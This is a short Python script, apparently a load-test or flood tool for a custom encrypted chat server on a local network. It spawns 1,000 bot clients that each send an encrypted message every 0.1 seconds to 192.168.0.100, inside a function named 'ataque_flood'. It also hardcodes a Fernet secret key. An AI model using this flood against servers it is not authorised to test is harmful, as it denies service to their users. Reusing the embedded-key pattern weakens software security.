import socket
import threading
import time
from cryptography.fernet import Fernet

chave_secreta = b'Qv5jwkrmmuZ1lgGNOYyk7UCy4dlNHkSXiRjLBNn-HHY='
fernet = Fernet(chave_secreta)

host = '192.168.0.100'
porta = 12345

NUM_CLIENTES = 1000
INTERVALO_MSG = 0.1

def ataque_flood(id_cliente):
    try:
        cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        cliente.connect((host, porta))
        print(f"[{id_cliente}] Conectado ao servidor.")

        nickname = f"bot{id_cliente}"
        cliente.sendall(fernet.encrypt(f"NICK:{nickname}".encode()))
        cliente.recv(4096)

        cliente.sendall(fernet.encrypt(b"grupo"))
        cliente.recv(4096)

        while True:
            mensagem = f"{nickname}: teste de carga {time.time()}"
            cliente.sendall(fernet.encrypt(mensagem.encode()))
            time.sleep(INTERVALO_MSG)
    except Exception as e:
        print(f"[{id_cliente}] Erro na conexão ou envio: {e}")

def main():
    threads = []

    for i in range(NUM_CLIENTES):
        t = threading.Thread(target=ataque_flood, args=(i,))
        t.daemon = True
        t.start()
        threads.append(t)
        time.sleep(0.02)

    print(f"[INFO] {NUM_CLIENTES} bots iniciados. Enviando mensagens em massa...")
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
